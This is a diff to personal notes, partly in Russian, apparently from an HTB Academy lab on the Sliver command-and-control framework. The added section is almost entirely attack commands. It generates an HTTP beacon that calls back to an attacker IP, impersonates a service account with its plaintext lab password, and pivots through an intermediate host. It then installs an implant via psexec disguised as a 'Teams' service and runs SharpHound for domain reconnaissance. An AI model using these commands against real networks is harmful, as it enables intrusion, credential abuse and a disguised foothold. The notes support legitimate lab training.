@@ -130,5 +130,26 @@ Sliver
     ls //srv02.child.htb.local/c$
 
     
-# Dumping credentials on SRV02
+# Боковое движение с шапхоунд
+
+    Создание токена пользователя (runas)
+
+    generate --http 10.10.16.14:9001 --skip-symbols --os windows -N http-beacon-9001
+
+    http -L 10.10.16.14 -l 9001
+
+    use session/beacon
+
+    SRV02 \ 01           child.htb.local\svc_sql:jkhnrjk123! (Pwn3d!)
+
+
+    make-token -u svc_sql -d child.htb.local -p jkhnrjk123!
+    биндим с удаленки на на наш средний сервер
+    pivots tcp --bind 172.16.1.11 (запускаем слушатель на пой промежуточный хост)
+    генерейтим бекон/servise
+    generate --format service -i 172.16.1.11:9898 --skip-symbols -N psexec-pivot
+    Jumping into the psexec utility, we must specify the path of the implant's binary.
+    psexec --custom-exe /home/htb-ac590/psexec-pivot.exe --service-name Teams --service-description MicrosoftTeaams srv01.child.htb.local (Запускаем бекон через psexec)
+    мы оказываеися не хосте
+    sliver (psexec-pivot) > sharp-hound-4 -- -c All --zipfilename academy  (шарпхоунд)
     
